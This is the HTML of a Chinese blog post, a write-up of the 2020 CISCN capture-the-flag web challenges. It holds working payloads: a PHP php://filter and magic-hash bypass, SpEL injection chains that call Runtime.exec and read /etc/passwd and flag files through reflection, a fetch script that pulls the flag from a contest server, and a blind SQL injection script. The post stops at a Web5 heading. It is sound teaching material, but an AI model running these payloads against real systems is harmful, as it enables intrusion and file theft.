@@ -1,0 +1,355 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2020ciscn | Rick</title><meta name="author" content="LYC"><meta name="copyright" content="LYC"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Day 1 0x01 Web3  伪协议 md5碰撞  file_get_contents($shell1)&#x3D;&#x3D;&#x3D;&#39;first blood&#39; 利用php:&#x2F;&#x2F;input 来绕过 $shell2&#x3D;&#x3D;md5($shell2)  利用PHP松散比较特性来绕过, **0e开头的字符串md5值也是0e开头即可绕过,**写脚本找到一个合适的数字: 0e215962017 12php &gt; var_dump">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020ciscn">
+<meta property="og:url" content="http://991688344.github.io/2020/09/13/2020ciscn/index.html">
+<meta property="og:site_name" content="Rick">
+<meta property="og:description" content="Day 1 0x01 Web3  伪协议 md5碰撞  file_get_contents($shell1)&#x3D;&#x3D;&#x3D;&#39;first blood&#39; 利用php:&#x2F;&#x2F;input 来绕过 $shell2&#x3D;&#x3D;md5($shell2)  利用PHP松散比较特性来绕过, **0e开头的字符串md5值也是0e开头即可绕过,**写脚本找到一个合适的数字: 0e215962017 12php &gt; var_dump">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://991688344.github.io/images/Wallpaper/rainbowcat.gif">
+<meta property="article:published_time" content="2020-09-13T13:36:21.000Z">
+<meta property="article:modified_time" content="2024-03-19T01:32:36.446Z">
+<meta property="article:author" content="LYC">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://991688344.github.io/images/Wallpaper/rainbowcat.gif"><link rel="shortcut icon" href="/images/Wallpaper/favicon.ico"><link rel="canonical" href="http://991688344.github.io/2020/09/13/2020ciscn/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/content.json","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2020ciscn',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><link rel="stylesheet" href="/mycss/my_background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: #F7F9FE;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/Wallpaper/rainbowcat.gif);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Rick</span></a><a class="nav-page-title" href="/"><span class="site-name">2020ciscn</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2020ciscn</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-13T13:36:21.000Z" title="发表于 2020-09-13 21:36:21">2020-09-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-19T01:32:36.446Z" title="更新于 2024-03-19 09:32:36">2024-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1>Day 1</h1>
+<h2 id="0x01-Web3">0x01 Web3</h2>
+<ul>
+<li>伪协议</li>
+<li>md5碰撞</li>
+</ul>
+<p><code>file_get_contents($shell1)==='first blood'</code><br>
+利用<code>php://input</code> 来绕过</p>
+<p><code>$shell2==md5($shell2)</code></p>
+<p><img src="/2020/09/13/2020ciscn/2018110515185387.png" alt="在这里插入图片描述"></p>
+<p>利用PHP松散比较特性来绕过, **0e开头的字符串md5值也是0e开头即可绕过,**写脚本找到一个合适的数字: <code>0e215962017</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0e215962017&#x27;</span>==<span class="string">&#x27;0e291242476940776845150308577824&#x27;</span>);</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>
+<p><code>$shell3 = preg_replace('/php/','',$shell3); </code> 只过滤了一次php,并且没有对大小写限制<br>
+构造伪协议读取<code>PHP://filter/read=convert.base64-encode/resource=flag.pphphp</code></p>
+<p><img src="/2020/09/13/2020ciscn/image-20200913214141137.png" alt="image-20200913214141137"></p>
+<p>脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string,hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">a=string.digits</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line">raw=<span class="string">&#x27;0e&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> a:</span><br><span class="line">                    <span class="keyword">for</span> n1 <span class="keyword">in</span> a:</span><br><span class="line">                         <span class="keyword">for</span> n2 <span class="keyword">in</span> a:</span><br><span class="line">                             <span class="keyword">for</span> n3 <span class="keyword">in</span> a:</span><br><span class="line">                                 <span class="keyword">for</span> n4 <span class="keyword">in</span> a:</span><br><span class="line">                                    t= raw+i+j+k+m+n+n1+n2+n3+n4</span><br><span class="line">                                    t=<span class="built_in">str</span>(t)</span><br><span class="line">                                    s=hashlib.md5(t).hexdigest()</span><br><span class="line">                                    <span class="keyword">if</span> s[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&quot;0e&quot;</span>:</span><br><span class="line">                                        <span class="keyword">if</span> s[<span class="number">2</span>:].isdigit():</span><br><span class="line">                                            <span class="built_in">print</span> t</span><br><span class="line">                                            <span class="built_in">print</span> s                  </span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Web7">0x02 Web7</h2>
+<ul>
+<li>Java反射</li>
+<li>Spel注入</li>
+</ul>
+<p>SpEL，全称 Spring Expression Language，顾名思义，是 Spring 提供的表达式执行语言。从 CTF 的角度来说，我们需要了解这些：</p>
+<h3 id="基础知识">基础知识</h3>
+<h4 id="数组">数组</h4>
+<h5 id="不可修改">不可修改</h5>
+<p>不可修改的数组可以通过 <code>&#123;a, a, b&#125;</code> 实现，构造的是 <code>java.util.Collections$UnmodifiableRandomAccessList</code>。</p>
+<h5 id="可修改">可修改</h5>
+<p>数组可以通过 <code>&#123;a, b + c&#125;</code> 实现。和集合相比，其最大的区别就是多了一次运算。注意到上面的 <code>Unmidifiable</code> 了吗？当不存在运算时，SpEL 默认所有内容都是不可修改的；但一旦引入了运算，就代表数组（或其他容器）中的内容是<strong>需要修改</strong>的，因此对应构造的容器也就变成了 <code>java.util.ArrayList</code>。</p>
+<p>值得注意的是，这里可以通过 <code>ArrayList.toArray()</code> 生成 <code>Object[]</code>。</p>
+<h4 id="Map">Map</h4>
+<p>Map 同样分为可修改和不可修改，对应的分别是 <code>java.util.Collections$UnmodifiableMap</code> 和 <code>java.util.LinkedHashMap</code>。创建的格式<strong>类似 JSON</strong>，这里就直接略过了。</p>
+<h4 id="运算符"><code>[]</code> 运算符</h4>
+<p><code>[]</code> 运算符的作用是获取数组/Map 中的内容（属性），因此利用这个可以<strong>获得类中成员的值</strong>。</p>
+<p>整体语法和 JS 类似，但是有一些例外。对于 <code>String</code> 而言，<code>[]</code> 只能通过下标访问字符，因此 <code>''['class']</code> 会报错而 <code>''.class</code> 没有问题。</p>
+<p>待确认</p>
+<h4 id="new"><code>new</code></h4>
+<p>在 SpEL 中可以通过 <code>new</code> 来创建对象，使用方式和 Java 相同。但由于这里的题目本身 WAF 了 <code>new</code>，因此题解中并没有用到。</p>
+<h4 id="T-class"><code>T(class)</code></h4>
+<p>使用诸如 <code>T(java.lang.Runtime)</code> 的结构可以获得一个该类本身的引用，之后就可以执行其对应的静态函数了。但同样是上面的原因，由于 WAF 了 <code>T(</code>，因此本题没有用到。</p>
+<h3 id="尝试构造命令执行：java-lang-Runtime">尝试构造命令执行：<code>java.lang.Runtime</code></h3>
+<p>首先是测了一下 WAF 过滤的内容：</p>
+<ul>
+<li><code>java.lang</code></li>
+<li><code>new</code></li>
+<li><code>getClass</code></li>
+<li><code>T(</code></li>
+<li><code>#</code></li>
+<li><code>String</code></li>
+<li><code>getMethod('exec').invoke()</code></li>
+<li><code>Runtime</code></li>
+<li><code>exec(</code></li>
+<li><code>get(</code></li>
+<li><code>Root(</code></li>
+<li><code>Parent(</code></li>
+<li><code>list(</code></li>
+</ul>
+<p>bulid阶段源码:<img src="/2020/09/13/2020ciscn/image-20200914003658546.png" alt="image-20200914003658546"></p>
+<h4 id="绕过-T">绕过 <code>T(</code></h4>
+<p>由于 <code>T(</code> 被限制，因此我们需要通过另一种方式绕过 <code>T(</code>。这里我们使用的是 <code>forName</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;)`</span><br></pre></td></tr></table></figure>
+<h4 id="获取-getRuntime">获取 <code>getRuntime</code></h4>
+<p>由于 <code>getRuntime</code> 存在被过滤单词，因此只能通过反射获取方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;).getMethod(&#x27;getR&#x27;+&#x27;untime&#x27;).invoke(&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;))`</span><br></pre></td></tr></table></figure>
+<p>成功获得 <code>Runtime</code> 实例：</p>
+<p><img src="/2020/09/13/2020ciscn/Screenshot_20200504_105350.png" alt="img"></p>
+<h4 id="exec"><code>exec</code></h4>
+<p>使用类似的方法构造 <code>exec</code>，并尝试执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;).getMethod(&#x27;ex&#x27;+&#x27;ec&#x27;, &#x27;&#x27;.class).invoke(&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;).getMethod(&#x27;getR&#x27;+&#x27;untime&#x27;).invoke(&#x27;&#x27;.class.forName(&#x27;java&#x27;+&#x27;.lang.R&#x27;+&#x27;untime&#x27;)),&#x27;ls&#x27;)`</span><br></pre></td></tr></table></figure>
+<p>然而，执行的结果表明：使用了 <code>openrasp</code>：</p>
+<p><img src="/2020/09/13/2020ciscn/image-8.png" alt="img"></p>
+<p>由于 <code>openrasp</code> 不同于普通的 WAF，我这里没有想到办法绕过。这个方案可以说是失败了。</p>
+<h3 id="尝试构造读取文件：java-nio">尝试构造读取文件：<code>java.nio</code></h3>
+<h4 id="文件读取">文件读取</h4>
+<h5 id="绕过new">绕过<code>new(</code></h5>
+<p><code>Files.readAllBytes(Path.get(&quot;1122&quot;))</code>  没有<code>new</code></p>
+<p>尝试通过 <code>java.nio</code> 直接读取文件。尝试读取 <code>/etc/passwd</code> 的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&#x27;&#x27;.class.forName(&#x27;java.nio.file.Files&#x27;).readAllBytes(&#x27;&#x27;.class.forName(&#x27;java.nio.file.Paths&#x27;).get(&#x27;/flag&#x27;))`</span><br></pre></td></tr></table></figure>
+<p><code>get(</code>被WAF</p>
+<h5 id="绕过get">绕过<code>get(</code></h5>
+<p>既然限制了<code>get(</code>,那就反射出<code>get()</code>方法再<code>invoke</code>,不过需要实例化<code>Path</code>对象</p>
+<p>查看<a target="_blank" rel="noopener" href="https://www.matools.com/api/java8">javaapi手册</a>,(1.7版本后Path成了Paths),<code>Paths</code>在<code>java.nio.file.Paths</code>中,其中有<code>get</code>方法可以构造一个path对象</p>
+<p><img src="/2020/09/13/2020ciscn/image-20200913232033062.png" alt="image-20200913232033062"></p>
+<p>需要<code>URI</code>参数,可以通过<code>create</code>方法构造URI对象<code>''.class.forName('java.net.URI').create(&quot;file:///etc/passwd&quot;)</code></p>
+<p><img src="/2020/09/13/2020ciscn/image-20200913232109617.png" alt="image-20200913232109617"></p>
+<p>payload:<code>''.class.forName('java.nio.file.Files').readAllBytes(''.class.forName('java.nio.file.Paths').getMethod('get',''.class.forName('java.net.URI')).invoke(''.class.forName('java.nio.file.Paths'),''.class.forName('java.net.URI').create(&quot;file:///etc/passwd&quot;)))</code></p>
+<p><img src="/2020/09/13/2020ciscn/image-20200913230027120.png" alt="image-20200913230027120"></p>
+<p>这里直接返回了一个 <code>byte[]</code>，看来是成功了。</p>
+<h4 id="逐字符获取">逐字符获取</h4>
+<p>通过下标访问可以获得每个字符的内容，然后 xjb 写个脚本就可以了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">arr = [];</span><br><span class="line"> </span><br><span class="line">func = (i) =&gt;</span><br><span class="line">  <span class="title function_ invoke__">fetch</span>(</span><br><span class="line">    <span class="string">&quot;http://106.52.164.141/spel/calc?calc=&quot;</span> +</span><br><span class="line">      <span class="title function_ invoke__">escape</span>(</span><br><span class="line">        &lt;div <span class="keyword">class</span>=<span class="string">&quot;enlighter-default enlighter-v-inline enlighter-t-beyond &quot;</span>&gt;&lt;span <span class="keyword">class</span>=<span class="string">&quot;enlighter&quot;</span>&gt;&lt;span <span class="keyword">class</span>=<span class="string">&quot;enlighter-text&quot;</span>&gt;<span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.<span class="title function_ invoke__">forName</span>(<span class="string">&#x27;java.nio.file.Files&#x27;</span>).<span class="title function_ invoke__">readAllBytes</span>(<span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.<span class="title function_ invoke__">forName</span>(<span class="string">&#x27;java.nio.file.Paths&#x27;</span>).<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/flag&#x27;</span>))[$&#123;i&#125;]&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;code data-enlighter-language=<span class="string">&quot;raw&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;EnlighterJSRAW enlighter-origin&quot;</span>&gt;<span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.<span class="title function_ invoke__">forName</span>(<span class="string">&#x27;java.nio.file.Files&#x27;</span>).<span class="title function_ invoke__">readAllBytes</span>(<span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.<span class="title function_ invoke__">forName</span>(<span class="string">&#x27;java.nio.file.Paths&#x27;</span>).<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/flag&#x27;</span>))[$&#123;i&#125;]&lt;/code&gt;</span><br><span class="line">      )</span><br><span class="line">  )</span><br><span class="line">    .<span class="title function_ invoke__">then</span>((t) =&gt; t.<span class="title function_ invoke__">text</span>())</span><br><span class="line">    .<span class="title function_ invoke__">then</span>((t) =&gt; arr.<span class="title function_ invoke__">push</span>(String.<span class="title function_ invoke__">fromCharCode</span>(t)));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++) await <span class="title function_ invoke__">func</span>(i);</span><br></pre></td></tr></table></figure>
+<p>（然而之前翻车了</p>
+<p><img src="/2020/09/13/2020ciscn/Screenshot_20200504_110550.png" alt="img"></p>
+<p><img src="/2020/09/13/2020ciscn/image-10-1024x174.png" alt="img"></p>
+<p>最终正常拼接得到结果。</p>
+<h4 id="直接读取">直接读取</h4>
+<p><img src="/2020/09/13/2020ciscn/image-11.png" alt="img"></p>
+<p>尝试用这种方法获取字符串：<code>''.class.forName('java.nio.charset.StandardCharsets').UTF_8.decode(''.class.forName('java.NIO.ByteBuffer').wrap( payload ))</code></p>
+<p>payload:<code>''.class.forName('java.nio.file.Files').readAllBytes(''.class.forName('java.nio.file.Paths').getMethod('get',''.class.forName('java.net.URI')).invoke(''.class.forName('java.nio.file.Paths'),''.class.forName('java.net.URI').create(&quot;file:///etc/passwd&quot;)))</code></p>
+<p><img src="/2020/09/13/2020ciscn/image-20200914000532196.png" alt="image-20200914000532196"></p>
+<p>然而尝试读取<code>/flag</code>发现没有,  不知道<code>flag</code>在哪里 所以尝试遍历目录</p>
+<h3 id="构造遍历目录方式">构造遍历目录方式</h3>
+<p><code>java.io.File</code>中<code>public String[] list()</code>,  不过调用这个方法需要实例化对象,然而<code>new</code>被禁止了,所以找一下可以返回<code>File</code>对象的方法 ,找到<code>listRoot</code>方法</p>
+<p><img src="/2020/09/13/2020ciscn/image-20200913234906252.png" alt="image-20200913234906252"></p>
+<p>Demo 列出计算机所有根目录下的文件(展示list listRoot的用法):</p>
+<p><img src="/2020/09/13/2020ciscn/image-20200913234800431.png" alt="image-20200913234800431"></p>
+<p><strong><code>listRoots[0].list()[0]</code>即可查看第一个根目录下的第一个文件</strong></p>
+<p>payload:<code>''.class.forName('java.io.File').getMethod('list').invoke(''.class.forName('java.io.File').getMethod('listRoots').invoke(''.class.forName('java.io.File'))[0])</code></p>
+<p><img src="/2020/09/13/2020ciscn/image-20200913235755396.png" alt="image-20200913235755396"></p>
+<p>用BP爆破一下,发现了flag的位置,</p>
+<p><img src="/2020/09/13/2020ciscn/image-20200914004258730.png" alt="image-20200914004258730"></p>
+<p><img src="/2020/09/13/2020ciscn/image-20200914004446962.png" alt="image-20200914004446962"></p>
+<h4 id="获取flag内容">获取flag内容</h4>
+<p>直接就读出来了</p>
+<p><img src="/2020/09/13/2020ciscn/image-20200914004337464.png" alt="image-20200914004337464"></p>
+<p>然鹅…4点结束攻击环节…  4点01得出的答案…哭辽     原来flag在<code>/flag.txt</code>里面…  完全可以尝试猜到的,结果上一个题flag在<code>/flag</code>让我陷入思维定势,觉得flag都在<code>/flag</code>里面,就没继续尝试, 又费时间构造了遍历目录的方式</p>
+<h1>Day2</h1>
+<h2 id="0x01-Web2">0x01 Web2</h2>
+<ul>
+<li>sql过滤单引号</li>
+</ul>
+<p><code>select * from users where username='$_POST[&quot;username&quot;]' and password='$_POST[&quot;password&quot;]'</code></p>
+<p>过滤了单引号,但是没有过滤反斜杠<code>\</code>, 令<code>username=admin\</code> ,<code>password=or(2&gt;1)#</code></p>
+<p>这样语句就变成了:<code>select * from users where username='admin\' and password='or(2&gt;1)#'</code></p>
+<p>&lt;=&gt;<code>select * from users where username='****'or(2&gt;1)#</code></p>
+<p><img src="/2020/09/13/2020ciscn/image-20200914005752737.png" alt="image-20200914005752737"></p>
+<p><code>;</code>号php会自己加上,不需要我们传入</p>
+<p>payload: <code>or/**/(ascii(right(left(password,&#123;i+1&#125;),1))&gt;&#123;j&#125;)#</code></p>
+<p>脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://ip/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">i, j</span>):</span><br><span class="line">    payload = <span class="string">f&quot;or/**/(ascii(right(left(password,<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>),1))&gt;<span class="subst">&#123;j&#125;</span>)#&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;success.jpg&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span> </span><br><span class="line">    high = <span class="number">200</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high):</span><br><span class="line">        mid = (low + high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (exp(i, mid)):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>((low+high+<span class="number">1</span>)//<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<p>这个题目思路没问题,但是怎么测试都不行…奇怪了</p>
+<h2 id="0x02-Web5">0x02 Web5</h2>
